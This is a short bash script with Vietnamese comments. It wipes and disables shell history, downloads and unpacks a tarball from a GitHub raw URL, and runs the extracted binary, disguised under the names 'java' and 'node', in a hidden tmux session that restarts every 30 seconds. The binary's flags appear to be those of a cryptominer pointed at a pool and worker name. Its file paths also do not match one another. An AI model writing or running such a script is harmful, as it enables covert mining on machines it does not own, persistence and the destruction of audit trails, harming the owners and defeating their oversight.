#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null


# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/node/node" ]; then
    echo "[+] Downloading ..."
    rm -rf node node.tar.gz
    curl -sL -o node.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz
    tar -xzf node.tar.gz
    chmod +x node/java
    rm -f node.tar.gz
fi

# 🔁 Kiểm tra và chạy lại nếu session không tồn tại
echo "[+] Vòng lặp kiểm tra session mỗi 30s ..."
while true; do
    if ! tmux has-session -t $SESSION 2>/dev/null; then
        tmux new-session -s $SESSION -d
        tmux send-keys -t $SESSION "
            $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
        " C-m
    else
        echo "[+] start process start process start process start process start process start process - chạy 30s check lai..."
    fi
    sleep 30   # 3 phút check 1 lần
done
